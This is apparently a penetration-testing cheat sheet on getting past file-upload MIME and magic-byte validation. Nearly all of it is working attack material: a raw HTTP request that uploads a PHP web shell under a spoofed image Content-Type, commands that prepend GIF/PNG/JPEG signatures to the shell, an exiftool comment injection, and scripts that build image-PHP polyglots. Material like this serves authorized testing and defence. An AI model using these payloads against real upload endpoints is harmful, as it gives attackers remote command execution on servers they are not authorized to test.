# File Upload - MIME Type Bypass

## Content-Type Header Manipulation
Server-side MIME validation often trusts the `Content-Type` header sent in the multipart request, which is fully client-controlled.

### Burp Repeater Bypass
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
------WebKitFormBoundary--
```
Just change `Content-Type: application/x-php` to `Content-Type: image/jpeg` while keeping the malicious filename/content.

## Common MIME Types to Spoof
```
image/jpeg
image/png
image/gif
text/plain
application/pdf
application/octet-stream
```

## Magic Byte / File Signature Bypass (server checks actual bytes, not header)

### Prepend Valid Magic Bytes to Malicious Payload
```bash
# GIF magic bytes + PHP payload
echo -ne 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.php.gif

# PNG magic bytes
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["c"]); ?>' >> shell.php

# JPEG magic bytes
printf '\xff\xd8\xff\xe0' > shell.php
echo '<?php system($_GET["c"]); ?>' >> shell.php
```

### PHP GD Bypass - Embed Payload in Valid Image (survives resize sometimes)
```bash
# Create actual valid image then append/embed PHP code in comment field
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg -o shell.php.jpg

# Or embed in IDAT chunk / EXIF metadata that survives processing
```

## Polyglot Files (valid image AND valid script)
```bash
# GIF+PHP polyglot
copy /b innocent.gif + shell.php polyglot.gif.php   # Windows
cat innocent.gif shell.php > polyglot.gif.php        # Linux
```

### JPEG Polyglot with Embedded PHP
```bash
python3 -c "
data = open('image.jpg','rb').read()
payload = b'<?php system(\$_GET[\"c\"]); ?>'
# Insert payload into JPEG comment segment (0xFFFE marker)
comment_segment = b'\xff\xfe' + len(payload).to_bytes(2,'big') + payload
new_data = data[:2] + comment_segment + data[2:]
open('shell.jpg.php','wb').write(new_data)
"
```

## File Signature Reference Table
| Type | Magic Bytes (hex) |
|------|-------------------|
| JPEG | FF D8 FF |
| PNG | 89 50 4E 47 0D 0A 1A 0A |
| GIF | 47 49 46 38 39 61 |
| PDF | 25 50 44 46 |
| ZIP | 50 4B 03 04 |

## Testing Approach
```
1. Upload with correct MIME + correct magic bytes + malicious extension → test if extension check alone stops it
2. Upload with correct MIME + wrong magic bytes → test if magic byte validation exists
3. If GD/imagick processes image, test polyglot survival after resize
4. Check if server re-encodes image (defeats most magic byte bypass, need pixel-embedded payload)
```
